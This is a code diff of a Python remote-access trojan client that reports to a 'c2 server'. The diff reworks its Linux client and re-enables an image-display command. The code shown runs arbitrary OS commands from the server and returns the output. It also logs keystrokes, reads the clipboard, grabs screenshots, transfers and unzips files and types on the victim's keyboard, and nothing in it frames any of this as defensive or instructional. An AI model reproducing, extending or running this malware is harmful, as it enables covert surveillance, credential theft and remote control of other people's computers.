@@ -10,23 +10,11 @@ from setting import (FILE_PUT, FILE_REQUEST, PORT, PWD_RESPONSE, CMD_REQUEST, CM
 from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from pyperclip import PyperclipWindowsException, PyperclipException, paste
 from pynput.keyboard import Listener, Key, Controller
-from PIL import ImageGrab, Image
-
-# for windows only
-# from os import getenv, chdir, getcwd, path
-#from rotatescreen import get_display
-#from winsound import SND_ASYNC, playsound
-
-# for linux 
+from PIL import ImageGrab, Image 
 from os import chdir, getenv, path, uname, getcwd
 
 # get target $env variables as our client identifiyers
-# linxu version
 client = getenv("USER", "unknown_username") + "@" + uname().nodename + "@" + str(time()) 
-
-# windows version
-# client = getenv("USERNAME", "unknown_username") + "@" + getenv("COMPUTERNAME", "unknown_computer_name") + "@" + str(time())
-
  
 def on_press(key):
     try:
@@ -139,11 +127,7 @@ if __name__ == "__main__":
                 post_to_server("Not A Directory", is_red=1)
             except OSError:
                 post_to_server("Os Error", is_red=1)
-            # else:
-            # #we now handle it when client http GET request
-            #     # post the directory when we actually change directorys
-            #     post_to_server(getcwd(), PWD_RESPONSE)
-    
+            
     
         # if command dosen't start with "client ", run the os commnd and send the  output ot the c2 server
         elif not command.startswith("client "):
@@ -273,14 +257,10 @@ if __name__ == "__main__":
                     post_to_server(f"[+] [{filename}] is unzipped on the {client}\n")
             except OSError:
                 post_to_server(f"{filepath} was not found on the {client}\n", is_red=1)
-            
-            
-        
-        
+         
         
         # "clinet kill" command to terminate client
-        elif command == "client kill":
-            post_to_server(f"{client} killed", is_red=1)
+        elif command == "client kill":            
             exit()
     
         # the "client delay" command will change the delay time between inactive re-connection attemps
@@ -311,7 +291,7 @@ if __name__ == "__main__":
                 else:
                     post_to_server(f"clipboard content saved to clipboard_{clip_count}.txt") 
         
-        # "client keylog on" command to start keylogging (have to be root)
+        # "client keylog on" command to start keylogging 
         elif command == "client keylog on":
             print(listener)
             if listener is None:
@@ -349,7 +329,7 @@ if __name__ == "__main__":
             else:
                 post_to_server("keylogger is not running\n", is_red=1)     
         
-         # "client type [TEXT]" command to type text on the client. 
+        # "client type [TEXT]" command to type text on the client. 
         # only suppoert for windows or linux with X server or uinput            
         elif command.startswith("client type"):
             keyboard = None
@@ -377,33 +357,21 @@ if __name__ == "__main__":
             except OSError:
                 post_to_server("only works on Windows OS", is_red=1)
             
-        # "client display [image_file]" will display the image on the client screen   
-        # elif command.startswith("client display"):
-        #     # split filepath and replace \ with / from the command
-        #     file_path = get_filepath(command)
+        #"client display [image_file]" will display the image on the client screen   
+        elif command.startswith("client display"):
+            # split filepath and replace \ with / from the command
+            file_path = get_filepath(command)
             
-        #     if file_path is None:
-        #         continue        
-        #     try:
-        #         image = Image.open(file_path)
-        #         image.show()
-        #         post_to_server(f"{file_path} is displayed on the client\n")
-        #     except OSError as e:
-        #         post_to_server(f"{e}\n", is_red=1)
-        #         post_to_server(f"{file_path} was unable to display on the {client}\n", is_red=1)  
-                
-        # "client flip screen" command to flip the screen of the client upside down (Windows only)
-        # elif command == "client flip screen" or command == "client flip":
-        #     screens = get_display()
+            if file_path is None:
+                continue        
+            try:
+                image = Image.open(file_path)
+                image.show()
+                post_to_server(f"{file_path} is displayed on the client\n")
+            except OSError as e:
+                post_to_server(f"{e}\n", is_red=1)
+                post_to_server(f"{file_path} was unable to display on the {client}\n", is_red=1)  
             
-        #     for screen in screens:
-        #         screen_pos = screen.current_orientation
-        #         post_to_server(f"current orientation: {screen_pos}")
-        #         screen.rotate_to((screen_pos + 180) % 360)
-        #         post_to_server(f"orientation after flipped: {screen.current_orientation}")
-                
-                
-    
         # "client max volume" command to set the client's volume to the maximum (windows or linux with X server or uinput)
         elif command == "client max volume":
             keyboard = Controller()
@@ -412,18 +380,4 @@ if __name__ == "__main__":
                 keyboard.release(Key.media_volume_up)
             post_to_server(f"OK!")
             
-        # "client play sound" command to play a sound on the client (Windows only)
-        # elif command.startswith("client play"):
-        #     file_path = get_filepath(command)
-        #     if file_path is None:
-        #         continue
-            
-        #     try:
-        #         if path.isfile(file_path) adn file_path.lower().endswith(".wav"):
-        #             playsound(file_path, SND_ASYNC)
-        #             post_to_server(f"{file_path} is playing on the {client}\n")
-        #         else:
-        #             post_to_server(f"{file_path} was not found on the {client} or the file is not end in .wav\n", is_red=1)
-        #     except OSError as e:
-        #         post_to_server(f"{file_path} was unable to be played on the {client}\n", is_red=1)    
-        #         post_to_server(f"{e}\n", is_red=1)  
+       
